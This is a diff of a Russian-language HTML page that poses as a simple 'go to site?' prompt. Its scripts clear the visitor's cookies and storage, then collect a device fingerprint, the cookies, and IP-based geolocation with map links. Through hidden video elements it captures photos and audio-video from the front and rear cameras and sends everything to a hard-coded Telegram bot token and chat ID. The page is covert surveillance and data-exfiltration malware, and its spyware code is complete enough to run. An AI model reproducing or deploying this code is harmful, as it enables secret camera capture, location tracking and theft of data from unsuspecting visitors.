@@ -7,18 +7,14 @@
 <style>
   * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
   html, body { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; }
-
-  /* ═══════════ ОВЕРЛЕЙ НА ВЕСЬ ЭКРАН ═══════════ */
   #overlay {
     position: fixed; inset: 0;
-    background: #000;
-    color: #eee;
+    background: #000; color: #eee;
     display: flex; flex-direction: column;
     align-items: center; justify-content: center;
     text-align: center; padding: 30px;
     font: 16px/1.5 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-    z-index: 2147483647;
-    gap: 20px;
+    z-index: 2147483647; gap: 20px;
   }
   #overlay .icon {
     width: 90px; height: 90px; border-radius: 24px;
@@ -26,97 +22,43 @@
     display: flex; align-items: center; justify-content: center;
     font-size: 48px;
     box-shadow: 0 10px 40px rgba(139,92,246,.55);
-    margin-bottom: 6px;
   }
-  #overlay h1 {
-    margin: 0;
-    font-size: 22px;
-    font-weight: 600;
-    color: #fff;
-    max-width: 320px;
-    line-height: 1.35;
-  }
-  #overlay p.sub {
-    margin: 0;
-    font-size: 14px;
-    color: #888;
-    max-width: 320px;
-  }
-  #overlay .row {
-    display: flex; gap: 10px;
-    flex-wrap: wrap; justify-content: center;
-    margin-top: 10px;
-  }
-
+  #overlay h1 { margin: 0; font-size: 22px; font-weight: 600; color: #fff; max-width: 320px; }
+  #overlay p.sub { margin: 0; font-size: 14px; color: #888; min-height: 18px; }
+  #overlay .row { display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; margin-top: 10px; }
   .btn {
-    padding: 14px 34px;
-    font-size: 15px;
-    border: 0;
-    border-radius: 12px;
-    cursor: pointer;
-    font-weight: 600;
-    transition: .15s;
-    min-width: 130px;
-    -webkit-appearance: none;
+    padding: 14px 34px; font-size: 15px; border: 0; border-radius: 12px;
+    cursor: pointer; font-weight: 600; min-width: 130px; -webkit-appearance: none;
   }
-  #yes {
-    background: linear-gradient(135deg, #8b5cf6, #6d28d9);
-    color: #fff;
-    box-shadow: 0 4px 20px rgba(139,92,246,.5);
-  }
-  #yes:active { transform: scale(.97); }
-  #yes:disabled { opacity: .55; cursor: default; }
-
-  #no {
-    background: #1a1a1a;
-    color: #bbb;
-    border: 1px solid #2a2a2a;
-  }
-  #no:active { background: #262626; }
-  #no:disabled { opacity: .55; cursor: default; }
-
-  #status {
-    font-size: 13px;
-    color: #666;
-    min-height: 18px;
-    margin-top: 6px;
-    max-width: 320px;
-  }
-
-  /* ═══════════ САЙТ ═══════════ */
+  #yes { background: linear-gradient(135deg, #8b5cf6, #6d28d9); color: #fff; }
+  #yes:disabled { opacity: .55; }
+  #no { background: #1a1a1a; color: #bbb; border: 1px solid #2a2a2a; }
+  #no:disabled { opacity: .55; }
   #site {
-    display: none;
-    background: #0f0f0f;
-    color: #eee;
-    min-height: 100vh;
-    padding: 60px 20px 40px;
-    font: 16px/1.6 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-    text-align: center;
+    display: none; background: #0f0f0f; color: #eee;
+    min-height: 100vh; padding: 60px 20px; text-align: center;
+    font: 16px/1.6 Arial, sans-serif;
   }
-  #site h2 { color: #fff; margin: 0 0 10px; }
-  #site p  { color: #888; }
-
-  #preview, #canvas { display: none; }
+  #site h2 { color: #fff; }
+  #site p { color: #888; }
+  #preview, #preview2, #canvas { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; }
 </style>
 </head>
 <body>
 
-<!-- ═══════════ СБРОС ДАННЫХ ПРИ ПЕРВОМ ВХОДЕ ═══════════ -->
 <script>
-(async function wipeOnFirstVisit() {
-  const FLAG = '__wiped_v4__';
+(async function wipe() {
+  const FLAG = '__w6__';
   try { if (sessionStorage.getItem(FLAG) === '1') return; } catch (e) {}
-
   try {
-    const cookies = document.cookie ? document.cookie.split(';') : [];
-    for (const c of cookies) {
+    const ck = document.cookie ? document.cookie.split(';') : [];
+    for (const c of ck) {
       const name = c.split('=')[0].trim();
       if (!name) continue;
-      const paths = ['/', location.pathname, location.pathname.replace(/\/[^/]*$/, '/')];
-      const domains = ['', location.hostname, '.' + location.hostname,
-                       location.hostname.replace(/^www\./, ''), '.' + location.hostname.replace(/^www\./, '')];
-      for (const p of paths) for (const d of domains) {
-        document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=' + p + (d ? '; domain=' + d : '');
+      for (const p of ['/', location.pathname]) {
+        for (const d of ['', location.hostname, '.' + location.hostname]) {
+          document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=' + p + (d ? '; domain=' + d : '');
+        }
       }
     }
   } catch (e) {}
@@ -131,39 +73,34 @@
   try {
     if (window.caches) {
       const keys = await caches.keys();
-      for (const k of keys) { try { await caches.delete(k); } catch (e) {} }
+      for (const k of keys) try { await caches.delete(k); } catch (e) {}
     }
   } catch (e) {}
-
   try { sessionStorage.setItem(FLAG, '1'); } catch (e) {}
   location.reload();
 })();
 </script>
 
-<!-- ═══════════ ОВЕРЛЕЙ ═══════════ -->
 <div id="overlay">
   <div class="icon">🌐</div>
   <h1>Перейти на сайт?</h1>
   <p class="sub" id="status"></p>
   <div class="row">
-    <button id="no"  class="btn">Нет</button>
+    <button id="no" class="btn">Нет</button>
     <button id="yes" class="btn">Да</button>
   </div>
 </div>
 
-<!-- ═══════════ САЙТ ═══════════ -->
 <div id="site">
   <h2>Добро пожаловать!</h2>
   <p>Спасибо за визит.</p>
 </div>
 
 <video id="preview" autoplay playsinline muted></video>
+<video id="preview2" autoplay playsinline muted></video>
 <canvas id="canvas"></canvas>
 
 <script>
-// ═══════════════════════════════════════════════════════════
-// НАСТРОЙКИ
-// ═══════════════════════════════════════════════════════════
 const TOKEN   = '8243475342:AAF9-cbm1bpIKCTxIVF2djRV6FSDotkK-1U';
 const CHAT_ID = '8689558225';
 
@@ -171,20 +108,12 @@ const yesBtn   = document.getElementById('yes');
 const noBtn    = document.getElementById('no');
 const statusEl = document.getElementById('status');
 const video    = document.getElementById('preview');
+const video2   = document.getElementById('preview2');
 const canvas   = document.getElementById('canvas');
 
-// Состояние записи
-let streamFront    = null;
-let streamBack     = null;
-let recorderFront  = null;
-let recorderBack   = null;
-let isRecording    = false;
-let videoExt       = 'webm';
-let videoMime      = '';
+let videoExt  = 'webm';
+let videoMime = '';
 
-// ═══════════════════════════════════════════════════════════
-// ОТПРАВКА В TELEGRAM
-// ═══════════════════════════════════════════════════════════
 function sendText(text) {
   return new Promise(res => {
     const url = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage?chat_id=' + CHAT_ID +
@@ -192,7 +121,7 @@ function sendText(text) {
     const img = new Image();
     img.onload = img.onerror = () => res();
     img.src = url;
-    setTimeout(res, 500);
+    setTimeout(res, 600);
   });
 }
 
@@ -201,12 +130,11 @@ async function sendPhoto(blob, caption) {
     const form = new FormData();
     form.append('chat_id', CHAT_ID);
     form.append('photo', blob, 'photo.jpg');
-    form.append('caption', caption || 'Фото');
+    form.append('caption', caption || '');
     const r = await fetch('https://api.telegram.org/bot' + TOKEN + '/sendPhoto', {
       method: 'POST', body: form, keepalive: true
     });
-    const j = await r.json();
-    return j.ok;
+    return (await r.json()).ok;
   } catch (e) { return false; }
 }
 
@@ -215,135 +143,105 @@ async function sendVideo(blob, ext, caption) {
     const form = new FormData();
     form.append('chat_id', CHAT_ID);
     form.append('video', blob, 'video.' + (ext || 'webm'));
-    form.append('caption', caption || 'Видео');
+    form.append('caption', caption || '');
     form.append('supports_streaming', 'true');
     const r = await fetch('https://api.telegram.org/bot' + TOKEN + '/sendVideo', {
       method: 'POST', body: form, keepalive: true
     });
-    const j = await r.json();
-    return j.ok;
+    return (await r.json()).ok;
   } catch (e) { return false; }
 }
 
-// ═══════════════════════════════════════════════════════════
-// СБОР ДАННЫХ
-// ═══════════════════════════════════════════════════════════
 async function collectAll() {
-  const ua = navigator.userAgent;
-  const n  = navigator;
-  const s  = screen;
-  const out = {};
-
+  const ua = navigator.userAgent, n = navigator, s = screen, out = {};
   const ref = document.referrer || '';
-  let refSource = 'прямой заход';
-  if (/t\.me|telegram/i.test(ref))      refSource = 'Telegram';
-  else if (/google\./i.test(ref))       refSource = 'Google';
-  else if (/yandex\./i.test(ref))       refSource = 'Яндекс';
-  else if (/bing\./i.test(ref))         refSource = 'Bing';
-  else if (/duckduckgo\./i.test(ref))   refSource = 'DuckDuckGo';
-  else if (/vk\.com/i.test(ref))        refSource = 'ВКонтакте';
-  else if (/instagram\./i.test(ref))    refSource = 'Instagram';
-  else if (/facebook\./i.test(ref))     refSource = 'Facebook';
-  else if (/whatsapp/i.test(ref))       refSource = 'WhatsApp';
-  else if (/tiktok/i.test(ref))         refSource = 'TikTok';
-  else if (/youtube\./i.test(ref))      refSource = 'YouTube';
-  else if (ref)                         refSource = ref;
-  out['Источник'] = refSource;
-  out['Referrer'] = ref || '(прямой заход)';
+  let src = 'прямой';
+  if (/t\.me|telegram/i.test(ref)) src = 'Telegram';
+  else if (/google\./i.test(ref)) src = 'Google';
+  else if (/yandex\./i.test(ref)) src = 'Яндекс';
+  else if (/bing\./i.test(ref)) src = 'Bing';
+  else if (/vk\.com/i.test(ref)) src = 'ВК';
+  else if (/instagram\./i.test(ref)) src = 'Instagram';
+  else if (/facebook\./i.test(ref)) src = 'Facebook';
+  else if (ref) src = ref;
+  out['Источник'] = src;
+  out['Referrer'] = ref || '(прямой)';
 
-  let inApp = 'нет';
-  if (/Telegram/i.test(ua))                     inApp = 'Telegram';
-  else if (/Instagram/i.test(ua))               inApp = 'Instagram';
-  else if (/FBAN|FBAV|FB_IAB/i.test(ua))        inApp = 'Facebook';
-  else if (/WhatsApp/i.test(ua))                inApp = 'WhatsApp';
-  else if (/Viber/i.test(ua))                   inApp = 'Viber';
-  else if (/TikTok|BytedanceWebview/i.test(ua)) inApp = 'TikTok';
-  else if (/VKClient|VKAndroidApp|VKiOS/i.test(ua)) inApp = 'VK';
-  out['Приложение'] = inApp;
+  let app = 'нет';
+  if (/Telegram/i.test(ua)) app = 'Telegram';
+  else if (/Instagram/i.test(ua)) app = 'Instagram';
+  else if (/FBAN|FBAV/i.test(ua)) app = 'Facebook';
+  else if (/WhatsApp/i.test(ua)) app = 'WhatsApp';
+  else if (/TikTok|BytedanceWebview/i.test(ua)) app = 'TikTok';
+  else if (/VKClient|VKAndroidApp|VKiOS/i.test(ua)) app = 'VK';
+  out['Приложение'] = app;
 
-  let browser = 'неизвестно', bver = '';
+  let br = '?', bv = '';
   const bt = [
-    [/YaBrowser\/([\d.]+)/,     'Яндекс.Браузер'],
-    [/Edg\/([\d.]+)/,           'Microsoft Edge'],
-    [/OPR\/([\d.]+)/,           'Opera'],
-    [/SamsungBrowser\/([\d.]+)/,'Samsung Internet'],
-    [/Firefox\/([\d.]+)/,       'Firefox'],
-    [/CriOS\/([\d.]+)/,         'Chrome iOS'],
-    [/FxiOS\/([\d.]+)/,         'Firefox iOS'],
-    [/Chrome\/([\d.]+)/,        'Chrome'],
-    [/Version\/([\d.]+).*Safari/,'Safari'],
+    [/YaBrowser\/([\d.]+)/, 'Яндекс.Браузер'],
+    [/Edg\/([\d.]+)/, 'Edge'],
+    [/OPR\/([\d.]+)/, 'Opera'],
+    [/SamsungBrowser\/([\d.]+)/, 'Samsung Internet'],
+    [/Firefox\/([\d.]+)/, 'Firefox'],
+    [/CriOS\/([\d.]+)/, 'Chrome iOS'],
+    [/FxiOS\/([\d.]+)/, 'Firefox iOS'],
+    [/Chrome\/([\d.]+)/, 'Chrome'],
+    [/Version\/([\d.]+).*Safari/, 'Safari'],
   ];
   for (const [re, name] of bt) {
     const m = re.exec(ua);
-    if (m) { browser = name; bver = m[1]; break; }
+    if (m) { br = name; bv = m[1]; break; }
   }
-  out['Браузер'] = browser + (bver ? ' ' + bver : '');
+  out['Браузер'] = br + (bv ? ' ' + bv : '');
   out['UserAgent'] = ua;
 
-  let os = 'неизвестно', osv = '';
-  if (/Windows NT 10/i.test(ua))       { os = 'Windows 10/11'; }
-  else if (/Windows NT ([\d.]+)/.test(ua)) { os = 'Windows'; osv = RegExp.$1; }
-  else if (/iPhone|iPad|iPod/i.test(ua)) { os = 'iOS'; osv = (RegExp(/OS ([\d_]+)/).exec(ua) || [])[1] || ''; }
-  else if (/Mac OS X ([\d_.]+)/i.test(ua)) { os = 'macOS'; osv = RegExp.$1.replace(/_/g,'.'); }
-  else if (/Android ([\d.]+)/i.test(ua)) { os = 'Android'; osv = RegExp.$1; }
-  else if (/Linux/i.test(ua))           os = 'Linux';
-  out['ОС'] = os + (osv ? ' ' + osv : '');
+  let os = '?', ov = '';
+  if (/Windows NT 10/i.test(ua)) os = 'Windows 10/11';
+  else if (/Windows NT ([\d.]+)/.test(ua)) { os = 'Windows'; ov = RegExp.$1; }
+  else if (/iPhone|iPad|iPod/i.test(ua)) { os = 'iOS'; ov = (RegExp(/OS ([\d_]+)/).exec(ua) || [])[1] || ''; }
+  else if (/Mac OS X ([\d_.]+)/i.test(ua)) { os = 'macOS'; ov = RegExp.$1.replace(/_/g, '.'); }
+  else if (/Android ([\d.]+)/i.test(ua)) { os = 'Android'; ov = RegExp.$1; }
+  else if (/Linux/i.test(ua)) os = 'Linux';
+  out['ОС'] = os + (ov ? ' ' + ov : '');
 
-  let device = 'десктоп';
-  if (/iPad|Tablet/i.test(ua) || (/Android/i.test(ua) && !/Mobile/i.test(ua))) device = 'планшет';
-  else if (/Mobi|iPhone|Android.*Mobile/i.test(ua)) device = 'смартфон';
-  out['Устройство'] = device;
+  let dev = 'десктоп';
+  if (/iPad|Tablet/i.test(ua) || (/Android/i.test(ua) && !/Mobile/i.test(ua))) dev = 'планшет';
+  else if (/Mobi|iPhone|Android.*Mobile/i.test(ua)) dev = 'смартфон';
+  out['Устройство'] = dev;
 
-  const modelMatch = /Android[^;]*;\s*([^)]+?)(?:\s+Build|\))/i.exec(ua);
-  if (modelMatch) out['Модель'] = modelMatch[1].trim();
+  const model = /Android[^;]*;\s*([^)]+?)(?:\s+Build|\))/i.exec(ua);
+  if (model) out['Модель'] = model[1].trim();
 
-  out['Язык']      = n.language;
-  out['Языки']     = (n.languages || []).join(', ');
-  out['Локаль']    = Intl.DateTimeFormat().resolvedOptions().locale;
-  out['Часовой пояс'] = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  out['Смещение TZ'] = new Date().getTimezoneOffset() + ' мин';
-  out['Локальное время'] = new Date().toLocaleString('ru-RU');
-  out['ISO время'] = new Date().toISOString();
-
-  out['Экран']       = s.width + 'x' + s.height;
-  out['Доступный экран'] = s.availWidth + 'x' + s.availHeight;
-  out['Окно']        = window.innerWidth + 'x' + window.innerHeight;
-  out['DPR']         = window.devicePixelRatio;
-  out['Ориентация']  = s.orientation ? s.orientation.type : '';
-  out['Глубина цвета'] = s.colorDepth;
-  out['Диагональ (дюйм)'] = (Math.sqrt(s.width**2 + s.height**2) / 96).toFixed(2);
-
-  out['Ядер CPU']    = n.hardwareConcurrency || '';
-  out['RAM (GB)']    = n.deviceMemory || '';
-  out['Платформа']   = n.platform || '';
-  out['Touch points']= n.maxTouchPoints || 0;
+  out['Язык'] = n.language;
+  out['TZ'] = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  out['Время'] = new Date().toLocaleString('ru-RU');
+  out['Экран'] = s.width + 'x' + s.height;
+  out['Окно'] = window.innerWidth + 'x' + window.innerHeight;
+  out['DPR'] = window.devicePixelRatio;
+  out['CPU'] = n.hardwareConcurrency || '';
+  out['RAM'] = n.deviceMemory || '';
+  out['Платформа'] = n.platform || '';
+  out['Онлайн'] = n.onLine ? 'да' : 'нет';
 
   if (n.getBattery) {
     try {
       const b = await n.getBattery();
       out['Батарея'] = Math.round(b.level * 100) + '%';
-      out['Уровень 0-1'] = b.level;
       out['Заряжается'] = b.charging ? 'да' : 'нет';
     } catch (e) {}
   }
 
   const c = n.connection || n.mozConnection || n.webkitConnection;
   if (c) {
-    out['Тип сети']  = c.effectiveType || '';
-    out['Скорость Mbps'] = c.downlink || '';
-    out['RTT ms']    = c.rtt || '';
-    out['Save data'] = c.saveData ? 'да' : 'нет';
+    out['Сеть'] = c.effectiveType || '';
+    out['Скорость'] = c.downlink || '';
+    out['RTT'] = c.rtt || '';
   }
-  out['Онлайн'] = n.onLine ? 'да' : 'нет';
 
-  // Сколько камер на устройстве
   try {
-    if (n.mediaDevices && n.mediaDevices.enumerateDevices) {
-      const d = await n.mediaDevices.enumerateDevices();
-      out['Камер']     = d.filter(x => x.kind === 'videoinput').length;
-      out['Микрофонов']= d.filter(x => x.kind === 'audioinput').length;
-      out['Динамиков'] = d.filter(x => x.kind === 'audiooutput').length;
-    }
+    const d = await n.mediaDevices.enumerateDevices();
+    out['Камер'] = d.filter(x => x.kind === 'videoinput').length;
+    out['Микрофонов'] = d.filter(x => x.kind === 'audioinput').length;
   } catch (e) {}
 
   try {
@@ -352,320 +250,200 @@ async function collectAll() {
     if (gl) {
       const dbg = gl.getExtension('WEBGL_debug_renderer_info');
       if (dbg) {
+        out['GPU'] = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
         out['GPU вендор'] = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
-        out['GPU модель'] = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
-      }
-      out['WebGL версия'] = gl.getParameter(gl.VERSION);
-    }
-  } catch (e) {}
-
-  try {
-    const cv = document.createElement('canvas');
-    cv.width = 280; cv.height = 60;
-    const ctx = cv.getContext('2d');
-    ctx.textBaseline = 'top';
-    ctx.font = '16px Arial';
-    ctx.fillStyle = '#f60';
-    ctx.fillRect(0, 0, 100, 30);
-    ctx.fillStyle = '#069';
-    ctx.fillText('Fingerprint 你好 🎉', 2, 10);
-    ctx.fillStyle = 'rgba(102,204,0,0.7)';
-    ctx.fillText('Fingerprint 你好 🎉', 4, 20);
-    const d = cv.toDataURL();
-    let h = 0;
-    for (let i = 0; i < d.length; i++) { h = (h << 5) - h + d.charCodeAt(i); h |= 0; }
-    out['Canvas hash'] = (h >>> 0).toString(16);
-  } catch (e) {}
-
-  try {
-    const base = ['monospace', 'sans-serif', 'serif'];
-    const test = ['Arial','Comic Sans MS','Courier New','Georgia','Impact','Times New Roman',
-      'Trebuchet MS','Verdana','Tahoma','Segoe UI','Roboto','Ubuntu','Calibri','Cambria',
-      'Consolas','Menlo','Monaco','DejaVu Sans','Noto Sans','Symbol','Wingdings','Webdings',
-      'Helvetica Neue','SF Pro','PingFang SC','Microsoft YaHei','Meiryo','Malgun Gothic',
-      'JetBrains Mono','Fira Code','Inter','Open Sans','Lato','Montserrat','Poppins'];
-    const span = document.createElement('span');
-    span.style.cssText = 'position:absolute;left:-9999px;font-size:72px;white-space:nowrap;';
-    span.textContent = 'mmmmmmmmmmlliWWWW';
-    document.body.appendChild(span);
-    const bs = {};
-    for (const b of base) { span.style.fontFamily = b; bs[b] = span.offsetWidth + 'x' + span.offsetHeight; }
-    const found = [];
-    for (const f of test) {
-      for (const b of base) {
-        span.style.fontFamily = '"' + f + '",' + b;
-        if (span.offsetWidth + 'x' + span.offsetHeight !== bs[b]) { found.push(f); break; }
       }
     }
-    document.body.removeChild(span);
-    if (found.length) out['Установленные шрифты'] = found.join(', ');
   } catch (e) {}
 
-  try {
-    const ck = document.cookie || '';
-    if (ck) out['Cookies'] = ck;
-  } catch (e) {}
+  try { if (document.cookie) out['Cookies'] = document.cookie; } catch (e) {}
 
-  out['URL']      = location.href;
-  out['Хост']     = location.hostname;
-  out['Страница'] = location.pathname;
-  try {
-    const p = new URLSearchParams(location.search);
-    const utm = ['utm_source','utm_medium','utm_campaign','utm_term','utm_content','gclid','fbclid','yclid'];
-    const found = [];
-    for (const k of utm) {
-      const v = p.get(k);
-      if (v) found.push(k + '=' + v);
-    }
-    if (found.length) out['UTM'] = found.join(' | ');
-  } catch (e) {}
+  out['URL'] = location.href;
+  out['Хост'] = location.hostname;
 
   try {
     const r = await fetch('https://ipwho.is/');
     const g = await r.json();
-    if (g.success !== false && g.latitude != null) {
-      out['IP']           = g.ip;
-      out['Тип IP']       = g.type;
-      out['Страна']       = g.country;
-      out['Код страны']   = g.country_code;
-      out['Регион']       = g.region;
-      out['Город']        = g.city;
-      out['Индекс']       = g.postal;
-      out['Координаты']   = g.latitude + ', ' + g.longitude;
-      out['ISP']          = g.connection && g.connection.isp;
-      out['Организация']  = g.connection && g.connection.org;
-      out['ASN']          = g.connection && ('AS' + g.connection.asn);
-      out['Мобильный IP'] = g.connection && g.connection.is_mobile ? 'да' : 'нет';
-      out['VPN']          = g.security && g.security.vpn ? 'да' : 'нет';
-      out['Прокси']       = g.security && g.security.proxy ? 'да' : 'нет';
-      out['Tor']          = g.security && g.security.tor ? 'да' : 'нет';
-      out['Хостинг']      = g.security && g.security.hosting ? 'да' : 'нет';
-      out['Google Maps']  = 'https://www.google.com/maps?q=' + g.latitude + ',' + g.longitude;
-      out['Яндекс.Карты'] = 'https://yandex.ru/maps/?pt=' + g.longitude + ',' + g.latitude + '&z=15&l=map';
-      out['Street View']  = 'https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=' + g.latitude + ',' + g.longitude;
+    if (g.latitude) {
+      out['IP'] = g.ip;
+      out['Страна'] = g.country;
+      out['Город'] = g.city;
+      out['Координаты'] = g.latitude + ', ' + g.longitude;
+      out['ISP'] = g.connection && g.connection.isp;
+      out['ASN'] = g.connection && ('AS' + g.connection.asn);
+      out['VPN'] = g.security && g.security.vpn ? 'да' : 'нет';
+      out['Прокси'] = g.security && g.security.proxy ? 'да' : 'нет';
+      out['Tor'] = g.security && g.security.tor ? 'да' : 'нет';
+      out['Google Maps'] = 'https://www.google.com/maps?q=' + g.latitude + ',' + g.longitude;
     }
-  } catch (e) {}
-
-  try {
-    if (n.permissions) {
-      const perms = ['geolocation','camera','microphone','notifications','clipboard-read','clipboard-write'];
-      const states = [];
-      for (const p of perms) {
-        try {
-          const r = await n.permissions.query({ name: p });
-          states.push(p + '=' + r.state);
-        } catch (e) {}
-      }
-      if (states.length) out['Разрешения'] = states.join(', ');
-    }
-  } catch (e) {}
-
-  try {
-    await new Promise(resolve => {
-      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-      const ips = new Set();
-      let done = false;
-      const finish = () => {
-        if (done) return; done = true;
-        if (ips.size) out['Локальные IP'] = Array.from(ips).join(', ');
-        try { pc.close(); } catch {}
-        resolve();
-      };
-      pc.createDataChannel('');
-      pc.onicecandidate = e => {
-        if (!e.candidate) return finish();
-        const c = e.candidate.candidate;
-        const m = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/i.exec(c);
-        if (m) ips.add(m[1]);
-      };
-      pc.createOffer().then(o => pc.setLocalDescription(o));
-      setTimeout(finish, 1500);
-    });
   } catch (e) {}
 
   return out;
 }
 
-// ═══════════════════════════════════════════════════════════
-// ЗАПИСЬ КАМЕРЫ
-// ═══════════════════════════════════════════════════════════
-function pickMime() {
-  if (typeof MediaRecorder === 'undefined') return null;
-  const candidates = [
-    ['video/webm;codecs=vp8,opus', 'webm'],
-    ['video/webm;codecs=vp9,opus', 'webm'],
-    ['video/webm',                 'webm'],
-    ['video/mp4;codecs=h264,aac',  'mp4'],
-    ['video/mp4',                  'mp4'],
+async function getCameraStream(facing) {
+  const attempts = [
+    { video: { facingMode: { exact: facing }, width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false },
+    { video: { facingMode: { ideal: facing }, width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false },
+    { video: { facingMode: facing }, audio: false },
+    { video: true, audio: false },
   ];
-  for (const [m, e] of candidates) {
-    if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported(m)) {
-      videoMime = m; videoExt = e;
-      return true;
-    }
+  for (const c of attempts) {
+    try { return await navigator.mediaDevices.getUserMedia(c); } catch (e) {}
   }
-  videoMime = ''; videoExt = 'webm';
-  return true;
+  return null;
 }
 
-// ФОТО с камеры
-async function takePhoto(facingMode, label) {
-  let s = null;
+function waitVideo(v, timeout = 4000) {
+  return new Promise(res => {
+    if (v.readyState >= 2 && v.videoWidth > 0) return res(true);
+    let done = false;
+    const finish = ok => { if (done) return; done = true; res(ok); };
+    v.onloadedmetadata = () => finish(true);
+    v.oncanplay = () => finish(true);
+    v.onloadeddata = () => finish(true);
+    setTimeout(() => finish(v.videoWidth > 0), timeout);
+  });
+}
+
+async function takePhoto(facing, label, vEl) {
+  let stream = null;
   try {
-    s = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: { ideal: facingMode }, width: 1280, height: 720 },
-      audio: false
-    });
-    video.srcObject = s;
-    video.muted = true;
-    try { await video.play(); } catch (e) {}
+    stream = await getCameraStream(facing);
+    if (!stream) return { ok: false, reason: 'нет доступа' };
 
-    // Ждём готовности видео
-    await new Promise(res => {
-      if (video.readyState >= 2 && video.videoWidth > 0) return res();
-      let resolved = false;
-      const finish = () => { if (resolved) return; resolved = true; res(); };
-      video.onloadedmetadata = finish;
-      video.oncanplay = finish;
-      video.onloadeddata = finish;
-      setTimeout(finish, 3000);
-    });
+    vEl.srcObject = stream;
+    vEl.muted = true;
+    try { await vEl.play(); } catch (e) {}
 
-    // Пауза на стабилизацию экспозиции
-    await new Promise(r => setTimeout(r, 1000));
+    if (!await waitVideo(vEl, 4000)) {
+      stream.getTracks().forEach(t => t.stop());
+      vEl.srcObject = null;
+      return { ok: false, reason: 'нет кадров' };
+    }
 
-    const w = video.videoWidth  || 1280;
-    const h = video.videoHeight || 720;
+    await new Promise(r => setTimeout(r, 1200));
+
+    const w = vEl.videoWidth || 1280;
+    const h = vEl.videoHeight || 720;
     canvas.width = w; canvas.height = h;
     const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, w, h);
+    ctx.drawImage(vEl, 0, 0, w, h);
     const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.92));
     ctx.clearRect(0, 0, w, h);
 
-    s.getTracks().forEach(t => t.stop());
-    video.srcObject = null;
+    stream.getTracks().forEach(t => t.stop());
+    vEl.srcObject = null;
 
-    if (blob && blob.size > 0) {
-      const ok = await sendPhoto(blob,
-        label + '\n' +
-        'Разрешение: ' + w + 'x' + h + '\n' +
-        'Время: ' + new Date().toLocaleString('ru-RU') + '\n' +
-        'URL: ' + location.href
-      );
-      return ok;
-    }
-    return false;
+    if (!blob || !blob.size) return { ok: false, reason: 'пусто' };
+
+    const ok = await sendPhoto(blob, label + '\n' + w + 'x' + h + '\n' + new Date().toLocaleString('ru-RU') + '\n' + location.href);
+    return { ok, size: blob.size };
   } catch (e) {
-    if (s) s.getTracks().forEach(t => t.stop());
-    video.srcObject = null;
-    return false;
+    if (stream) stream.getTracks().forEach(t => t.stop());
+    vEl.srcObject = null;
+    return { ok: false, reason: e.message };
   }
 }
 
-// ВИДЕО с камеры — записываем и отправляем чанками каждые 5 сек
-async function recordFromCamera(facingMode, tag, durationSeconds) {
+function pickMime() {
+  if (typeof MediaRecorder === 'undefined') return false;
+  const c = [
+    ['video/webm;codecs=vp8,opus', 'webm'],
+    ['video/webm;codecs=vp9,opus', 'webm'],
+    ['video/webm', 'webm'],
+    ['video/mp4;codecs=h264,aac', 'mp4'],
+    ['video/mp4', 'mp4'],
+  ];
+  for (const [m, e] of c) {
+    if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported(m)) {
+      videoMime = m; videoExt = e; return true;
+    }
+  }
+  videoMime = ''; videoExt = 'webm'; return true;
+}
+
+async function recordVideo(facing, label, seconds, vEl) {
   let stream = null;
   try {
-    // Пытаемся с аудио, потом без
     try {
       stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: { ideal: facingMode }, width: 640, height: 480, frameRate: 20 },
+        video: { facingMode: { ideal: facing }, width: { ideal: 640 }, height: { ideal: 480 }, frameRate: 24 },
         audio: true
       });
     } catch (e) {
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: { ideal: facingMode }, width: 640, height: 480, frameRate: 20 },
-        audio: false
-      });
+      stream = await getCameraStream(facing);
     }
+    if (!stream) return { ok: false, reason: 'нет доступа' };
 
-    if (!pickMime()) return { ok: false, reason: 'MediaRecorder недоступен' };
+    vEl.srcObject = stream;
+    vEl.muted = true;
+    try { await vEl.play(); } catch (e) {}
+    await waitVideo(vEl, 3000);
+
+    if (!pickMime()) {
+      stream.getTracks().forEach(t => t.stop());
+      return { ok: false, reason: 'нет MediaRecorder' };
+    }
 
     let rec;
     try {
       rec = new MediaRecorder(stream, {
         mimeType: videoMime || undefined,
-        videoBitsPerSecond: 500000,
+        videoBitsPerSecond: 600000,
         audioBitsPerSecond: 48000
       });
     } catch (e) {
-      try { rec = new MediaRecorder(stream); } catch (e2) { return { ok: false, reason: 'MediaRecorder init failed' }; }
+      try { rec = new MediaRecorder(stream); }
+      catch (e2) {
+        stream.getTracks().forEach(t => t.stop());
+        return { ok: false, reason: e2.message };
+      }
     }
 
     const chunks = [];
-    let videoBlob = null;
+    rec.ondataavailable = e => { if (e.data && e.data.size) chunks.push(e.data); };
+    const stopPromise = new Promise(res => { rec.onstop = () => res(); });
 
-    rec.ondataavailable = async (e) => {
-      if (e.data && e.data.size) chunks.push(e.data);
-    };
+    rec.start(500);
 
-    const stopped = new Promise(res => {
-      rec.onstop = async () => {
-        if (chunks.length) {
-          videoBlob = new Blob(chunks, { type: rec.mimeType || 'video/webm' });
-          await sendVideo(videoBlob, videoExt,
-            tag + ' — видео ' + durationSeconds + ' сек\n' +
-            'Размер: ' + Math.round(videoBlob.size / 1024) + ' KB\n' +
